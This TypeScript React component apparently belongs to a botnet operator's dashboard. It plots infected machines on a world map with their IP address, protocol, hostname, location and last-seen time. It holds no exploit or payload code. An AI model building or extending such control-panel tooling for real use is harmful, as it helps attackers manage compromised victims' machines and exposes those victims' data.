/**
 * InfectionMap Component - Global Infection Visualization
 * 
 * Displays bot locations on an interactive dark-themed map using React-Leaflet.
 */

import React from 'react';
import { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';
import { Icon } from 'leaflet';
import { formatDistanceToNow } from 'date-fns';
import type { BotWithGeo } from '@/types';
import 'leaflet/dist/leaflet.css';

interface InfectionMapProps {
  bots: BotWithGeo[];
  className?: string;
}

// Custom icon for bot markers
const botIcon = new Icon({
  iconUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iOCIgZmlsbD0iI2ZmMDAwMCIgZmlsbC1vcGFjaXR5PSIwLjMiLz4KPGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iNCIgZmlsbD0iI2ZmMDAwMCIvPgo8Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSI4IiBzdHJva2U9IiNmZjAwMDAiIHN0cm9rZS13aWR0aD0iMiIvPgo8L3N2Zz4=',
  iconSize: [24, 24],
  iconAnchor: [12, 12],
  popupAnchor: [0, -12],
});

export const InfectionMap: React.FC<InfectionMapProps> = ({ bots, className = '' }) => {
  // Filter bots with valid coordinates
  const botsWithCoords = bots.filter(
    (bot) => bot.latitude !== undefined && bot.longitude !== undefined
  );

  // Default center (if no bots, show world view)
  const defaultCenter: [number, number] = [20, 0];
  const defaultZoom = 2;

  return (
    <div className={`ops-card overflow-hidden ${className}`}>
      {/* Header */}
      <div className="ops-card-header mb-2">
        <span>Global Infection Map</span>
        <span className="text-gray-500 text-[10px]">
          {botsWithCoords.length} locations
        </span>
      </div>

      {/* Map */}
      <div className="relative" style={{ height: '400px' }}>
        <MapContainer
          center={defaultCenter}
          zoom={defaultZoom}
          style={{ height: '100%', width: '100%' }}
          className="rounded"
        >
          {/* Dark theme tiles */}
          <TileLayer
            attribution='&copy; <a href="https://carto.com/">CARTO</a>'
            url="https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png"
          />

          {/* Bot markers */}
          {botsWithCoords.map((bot) => (
            <Marker
              key={bot.id}
              position={[bot.latitude!, bot.longitude!]}
              icon={botIcon}
            >
              <Popup>
                <div className="font-mono text-xs space-y-1">
                  <div className="font-semibold text-ops-red border-b border-ops-border pb-1 mb-2">
                    {bot.bot_id || `BOT-${bot.id}`}
                  </div>
                  
                  <div className="space-y-1">
                    <div>
                      <span className="text-gray-500">IP:</span>
                      <span className="ml-2 text-ops-green">{bot.ip_address}</span>
                    </div>
                    
                    <div>
                      <span className="text-gray-500">Protocol:</span>
                      <span className="ml-2 text-ops-red">{bot.protocol}</span>
                    </div>
                    
                    {bot.country && (
                      <div>
                        <span className="text-gray-500">Location:</span>
                        <span className="ml-2">
                          {bot.city && `${bot.city}, `}{bot.country}
                        </span>
                      </div>
                    )}
                    
                    {bot.hostname && (
                      <div>
                        <span className="text-gray-500">Host:</span>
                        <span className="ml-2">{bot.hostname}</span>
                      </div>
                    )}
                    
                    <div className="pt-2 border-t border-ops-border mt-2">
                      <span className="text-gray-500 text-[10px]">
                        Last seen: {formatDistanceToNow(new Date(bot.last_seen), { addSuffix: true })}
                      </span>
                    </div>
                  </div>
                </div>
              </Popup>
            </Marker>
          ))}
        </MapContainer>

        {/* Overlay warning if no geolocation data */}
        {botsWithCoords.length === 0 && (
          <div className="absolute inset-0 flex items-center justify-center bg-ops-black bg-opacity-80 z-[1000]">
            <div className="text-center text-gray-500">
              <div className="text-sm mb-2">No geolocation data available</div>
              <div className="text-xs">
                Bot metadata does not include coordinates
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default InfectionMap;
